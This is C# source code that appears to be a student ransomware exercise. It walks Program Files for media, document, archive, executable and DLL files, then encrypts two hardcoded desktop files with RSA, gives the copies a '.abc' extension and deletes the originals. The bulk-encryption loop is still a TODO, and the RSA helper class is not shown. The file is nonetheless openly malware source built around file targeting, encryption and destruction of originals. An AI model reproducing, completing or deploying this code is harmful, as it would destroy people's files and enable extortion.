﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace FinalSolution
{
    class Program
    {
        private static string publicKey;
        private static string privateKey;

        static void Main(string[] args)
        {
            var specialFolders = new List<Environment.SpecialFolder>()
            {
                //Environment.SpecialFolder.Desktop,
                //Environment.SpecialFolder.MyPictures,
                //Environment.SpecialFolder.Recent,
                Environment.SpecialFolder.ProgramFiles,
                Environment.SpecialFolder.ProgramFilesX86
            };
            foreach (var specialFolder in specialFolders)
            {
                try
                {
                    var filesOfSpecificFolder = Directory
                        .EnumerateFiles(Environment.GetFolderPath(specialFolder), "*.*", SearchOption.AllDirectories)
                        .Where(s => s.EndsWith(".mp3") || s.EndsWith(".mp4") || s.EndsWith(".png") || s.EndsWith(".exe") ||
                                    s.EndsWith(".jpeg") || s.EndsWith(".jpg") || s.EndsWith(".pdf") || s.EndsWith(".rar") ||
                                    s.EndsWith(".zip") || s.EndsWith(".msi") || s.EndsWith(".doc") || s.EndsWith(".doc") ||
                                    s.EndsWith(".xml") || s.EndsWith(".dll") || s.EndsWith(".xls") || s.EndsWith(".xlsx") ||
                                    s.EndsWith(".ppt") || s.EndsWith(".pptx") || s.EndsWith(".docx")).ToList();
                    foreach (var file in filesOfSpecificFolder)
                    {
                        try
                        {
                            // TODO: Encrypt
                            Debug.Print(file);
                        }
                        catch {/* Maybe next time*/}
                    }
                }
                catch {/* Probably access denied */}
            }
            RSA.GenerateRSAKeyPair(out publicKey, out privateKey);
            encryptFile(@"C:\Users\dor.ben\Desktop\MyAgent.exe");
            encryptFile(@"C:\Users\dor.ben\Desktop\lab_10(1).pdf");
        }

        public static void encryptFile(string filePath)
        {
            string plainFilePath = filePath;
            string encryptedFilePath = MakePath(plainFilePath, ".abc");
            string s = RSA.Encrypt(plainFilePath,
                encryptedFilePath,
                publicKey);
            File.Delete(filePath);
        }

        private static string MakePath(string plainFilePath, string newSuffix)
        {
            string encryptedFileName = Path.GetFileNameWithoutExtension(plainFilePath) + newSuffix;
            return Path.Combine(Path.GetDirectoryName(plainFilePath), encryptedFileName);
        }
    }
}
